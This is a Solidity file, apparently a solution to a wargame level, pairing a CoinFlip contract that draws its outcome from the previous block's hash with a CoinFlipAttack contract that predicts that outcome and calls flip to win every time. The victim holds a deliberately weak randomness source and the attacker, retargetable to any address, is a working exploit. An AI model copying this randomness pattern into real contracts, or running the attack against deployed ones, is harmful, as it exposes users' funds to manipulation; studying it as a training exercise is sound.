contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

contract CoinFlipAttack {
    CoinFlip public coinFlip;
    bool public preCalculatedFlip;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public owner;

    constructor(address _coinFlipAddress) {
        coinFlip = CoinFlip(_coinFlipAddress);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function changeTarget(address newTarget) public onlyOwner {
        coinFlip = CoinFlip(newTarget);
    }

    function preCalculateFlip() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        return ( blockValue / FACTOR ) == 1 ? true : false;
    }

    function attackCoinFlip() public {
        preCalculatedFlip = preCalculateFlip();
        coinFlip.flip(preCalculatedFlip);
    }
}
